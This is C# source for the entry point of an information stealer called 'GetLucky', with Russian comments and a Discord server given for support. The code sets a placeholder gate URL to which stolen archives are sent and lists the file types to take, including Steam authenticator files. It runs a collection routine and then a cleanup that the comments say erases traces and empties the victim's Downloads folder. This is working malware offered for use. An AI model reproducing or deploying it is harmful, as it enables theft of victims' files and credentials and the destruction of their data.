using GetLucky.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

// Создано при поддержке сервера https://discord.com/invite/AvAZdq9

namespace GetLucky
{
    class Program
    {
        #region Settings Stealer
        
        public static string link       = "http://domain.com/gate.php"; // Ссылка на .php
        public static string passzip    = "1337";                       // Пароль к архиву
        public static int    sizefile   = 1500000;                      //Размер буфера файлов. Здоровый, как твой хер.

        public static string[] expansion = new string[] { ".txt", ".doc", ".rar", ".zip", ".cfg", ".png", ".jpg", ".mafile" };

        // Создано при поддержке дискорд сервера https://discord.com/invite/AvAZdq9
        // В СЛУЧАЕ ОШИБОК И ПРОБЛЕМ ОБРАЩАТЬСЯ К ПОЛЬЗОВАТЕЛЯМ НА СЕРВЕРЕ!

        #endregion
        #region Proxy
        // Далее ничего вводить и трогать не нужно!
        public static string ip = ""; // IP Proxy
        public static int port = 8000; // Порт Proxy
        public static string login = ""; // Логин Proxy
        public static string password = ""; // Пароль Proxy
        #endregion
        #region Stealer
        [STAThread]
        private static void Main()
        {
            try
            {
                // Подключаем нужные библиотеки
                AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
                Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
                {
                    if (args.Name.Contains("DotNetZip"))
                        return Assembly.Load(Resources.DotNetZip);

                    return null;
                }
                

                // Проверка файла Help.HWID
                if (!File.Exists(Help.LocalData + "\\" + Help.HWID))
                {
                    // Файла Help.HWID нет, запускаем стиллер
                    Collection.GetCollection();
                }

                else
                {
                    // Файл Help.HWID есть, проверяем записанную в нем дату
                    if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID + Help.dateLog))
                    {
                        // Дата в файле Help.HWID отличается от сегодняшней, запускаем стиллер
                        Collection.GetCollection();
                    }
                    else
                    {
                        // В файле Help.HWID сегодняшняя дата, закрываемся, означает что сегодня уже был лог с данного пк и не нужно слать повторы.
                        Collection.GetCollection();
                    }
                }
            }
            catch
            {
                
                return;
            }

            finally
            {
                // Чистим следы за собой, небольшой метод вторичной проверки. Так же метод очищает папку Downloads у юзера
                Clean.GetClean();
            }
        }
        #endregion
    }
}